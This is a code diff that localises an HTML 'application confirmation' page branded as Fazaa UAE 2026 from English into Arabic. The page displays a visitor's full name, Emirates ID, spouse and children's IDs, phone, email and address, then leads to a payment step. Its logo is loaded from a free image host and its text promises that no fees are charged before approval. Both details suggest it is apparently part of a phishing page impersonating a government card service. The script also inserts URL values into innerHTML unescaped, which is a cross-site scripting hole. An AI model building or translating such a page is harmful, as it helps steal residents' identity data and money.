@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Application Confirmation - Fazaa 2026</title>
+    <title>تأكيد الطلب - فزعة 2026</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #f5f7fa; color: #1e3a5f; line-height: 1.6; }
@@ -27,13 +27,13 @@
         .step.done { color: #d4af37; }
         .step.done .step-num { background-color: #d4af37; color: #fff; }
 
-        .summary-card { background: #ffffff; border-radius: 16px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #edf2f7; margin-bottom: 30px; text-align: left; }
+        .summary-card { background: #ffffff; border-radius: 16px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #edf2f7; margin-bottom: 30px; text-align: right; }
         .summary-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f7fafc; }
         .summary-item:last-child { border-bottom: none; }
         .summary-label { font-weight: bold; color: #718096; }
         .summary-value { color: #1e3a5f; font-weight: 600; }
 
-        .payment-info { background-color: #ebf8ff; border: 1px solid #bee3f8; color: #2b6cb0; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 0.9rem; text-align: left; font-weight: 500; }
+        .payment-info { background-color: #ebf8ff; border: 1px solid #bee3f8; color: #2b6cb0; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 0.9rem; text-align: right; font-weight: 500; }
 
         .btn-payment { background: #1e3a5f; color: #ffffff; font-weight: bold; padding: 18px; border-radius: 50px; border: none; width: 100%; font-size: 1.2rem; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 12px rgba(30, 58, 95, 0.2); }
         .btn-payment:hover { background: #142842; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(30, 58, 95, 0.3); }
@@ -48,22 +48,22 @@
         <div class="header-container">
             <div style="width: 80px;"></div>
             <div class="logo-container">
-                <img src="https://i.ibb.co/MDLJXRC1/unnamed-2.png" alt="Fazaa Logo">
+                <img src="https://i.ibb.co/MDLJXRC1/unnamed-2.png" alt="شعار فزعة">
             </div>
             <div style="width: 80px;"></div>
         </div>
     </header>
 
     <div class="container">
-        <h1 class="main-title">Confirm Your Details</h1>
-        <p class="sub-title">Please review your information before proceeding to payment.</p>
+        <h1 class="main-title">تأكيد البيانات</h1>
+        <p class="sub-title">يرجى مراجعة بياناتك قبل الانتقال إلى خطوة الدفع.</p>
 
         <div class="steps-container">
-            <div class="step done"><span class="step-num">1</span> Data</div>
+            <div class="step done"><span class="step-num">1</span> البيانات</div>
             <div class="step-line" style="background-color: #d4af37;"></div>
-            <div class="step active"><span class="step-num">2</span> Confirmation</div>
+            <div class="step active"><span class="step-num">2</span> التأكيد</div>
             <div class="step-line"></div>
-            <div class="step"><span class="step-num">3</span> Payment</div>
+            <div class="step"><span class="step-num">3</span> الدفع</div>
         </div>
 
         <div class="summary-card" id="summaryCard">
@@ -71,32 +71,32 @@
         </div>
 
         <div class="payment-info">
-            No fees will be charged until your application has been reviewed and approved. In case your application is not approved, no fees will be deducted.
+            لن يتم تحصيل منك أي رسوم إلا بعد ما رجعت الطلب والموافقة عليه. في حالة عدم الموافقة على طلبك لن يتم خصم أي رسوم منك.
         </div>
 
-        <button class="btn-payment" id="paymentBtn" onclick="alert('Proceeding to payment...')">Continue to Payment</button>
+        <button class="btn-payment" id="paymentBtn" onclick="alert('جاري الانتقال إلى الدفع...')">متابعة الدفع</button>
     </div>
 
     <footer>
-        <div class="copyright">&copy; 2026 All rights reserved to Fazaa UAE.</div>
+        <div class="copyright">&copy; 2026 جميع الحقوق محفوظة لفزعة الإمارات.</div>
     </footer>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const labels = {
-            card_type: "Card Type",
-            full_name: "Full Name",
-            emirates_id: "Emirates ID",
-            spouse_name: "Spouse Name",
-            spouse_id: "Spouse ID",
-            phone: "Phone Number",
-            email: "Email",
-            residency_status: "Residency Status",
-            emirate: "Emirate",
-            area: "Area",
-            street: "Street",
-            building: "Building",
-            floor_apartment: "Floor/Apt"
+            card_type: "نوع البطاقة",
+            full_name: "الاسم الكامل",
+            emirates_id: "رقم الهوية",
+            spouse_name: "اسم الزوج/الزوجة",
+            spouse_id: "هوية الزوج/الزوجة",
+            phone: "رقم الهاتف",
+            email: "البريد الإلكتروني",
+            residency_status: "حالة الإقامة",
+            emirate: "الإمارة",
+            area: "المنطقة",
+            street: "الشارع",
+            building: "المبنى",
+            floor_apartment: "الدور/الشقة"
         };
 
         const summaryCard = document.getElementById('summaryCard');
@@ -128,7 +128,7 @@
                 const item = document.createElement('div');
                 item.className = 'summary-item';
                 item.style.borderTop = "1px dashed #e2e8f0";
-                item.innerHTML = `<span class="summary-label">Child ${i}</span><span class="summary-value">${name} (${id})</span>`;
+                item.innerHTML = `<span class="summary-label">الابن/الابنة ${i}</span><span class="summary-value">${name} (${id})</span>`;
                 summaryCard.appendChild(item);
             }
         }
